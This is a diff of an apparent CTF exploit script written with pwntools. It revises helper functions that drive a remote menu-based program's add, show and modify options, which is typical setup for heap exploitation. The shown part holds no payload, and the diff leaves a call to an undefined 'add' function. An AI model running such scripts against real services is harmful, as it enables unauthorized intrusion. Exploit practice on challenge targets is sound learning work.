@@ -12,20 +12,24 @@ y = remote( host , port )
 
 
 def add_h( name , dsc ):
-        y.sendafter( 'ice:' , '2' )
-        y.sendafter( '?:' , str( idx ) )
-        y.sendafter( ':' , data )
+        y.sendafter( 'ice:' , '1' )
+        y.sendafter( ':' , dsc )
+        y.sendafter( ':' , name )
 
-def add_g( name , dsc )
+def add_g( name , size , dsc ):
+        y.sendafter( 'ice:' , '3' )
+        y.sendafter( ':' , dsc )
+        y.sendafter( ':' , str( size ) )
+        y.sendafter( ':' , name )
+
 
 def sho( idx ):
-        y.sendafter( 'ice:' , '3' )
-        y.sendafter( '?:' , str( idx ) )
+        y.sendafter( 'ice:' , '5' )
 
-def mod( idx , data ):
+def mod_h( idx , name ):
         y.sendafter( 'ice:' , '4' )
-        y.sendafter( '?:' , str( idx ) )
-        y.sendafter( ':' , data )
+        y.sendafter( 'x:' , str( idx ) )
+        y.sendafter( ':' , name )
 
 
 add( 1 , 'a' * 0x10 )
